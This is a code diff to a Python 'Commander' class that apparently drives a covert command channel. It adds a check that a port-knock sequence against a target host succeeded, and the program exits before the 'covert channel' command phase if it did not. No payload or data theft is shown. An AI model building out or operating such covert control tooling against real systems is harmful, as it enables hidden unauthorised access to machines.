@@ -87,22 +87,30 @@ class Commander:
         print(f"Sequence: {self.knock_ports}")
         print()
 
+        successful_knocks = 0
         for port in self.knock_ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(2)
-                print(f"[+] Knocking on TCP port {port}...", end=" ", flush=True)
+                print(f"Knocking on TCP port {port}...", end="\n", flush=True)
                 sock.connect((self.target_host, port))
                 sock.close()
-                print("✓")
+                successful_knocks += 1
             except Exception as e:
-                print(f"✗ ({e})")
+                print(f"({e})")
             time.sleep(0.5)
 
-        print("\n[+] Port knock sequence complete!")
-        print("[*] Authorization granted for covert channel")
-        print("=" * 60)
-        time.sleep(1)
+        if successful_knocks == len(self.knock_ports):
+            print("\n[+] Port knock sequence complete!")
+            print("[*] Authorization granted for covert channel")
+            print("=" * 60)
+            time.sleep(1)
+            return True
+        else:
+            print(f"\n[✗] Knock failed — only {successful_knocks}/{len(self.knock_ports)} ports accepted.")
+            print("[!] Wrong sequence or client not running.")
+            print("=" * 60)
+            return False
 
     def send_covert_command(self, command_type, payload=b'', context=None):
         """
@@ -208,7 +216,10 @@ class Commander:
         print(f"Source: {self.source_ip}")
         print("=" * 60)
 
-        self.perform_port_knock()
+        successful_port_knocks = self.perform_port_knock()
+
+        if not successful_port_knocks:
+            exit()
 
         print("\n" + "=" * 60)
         print("PHASE 2: Covert Channel Command Interface")
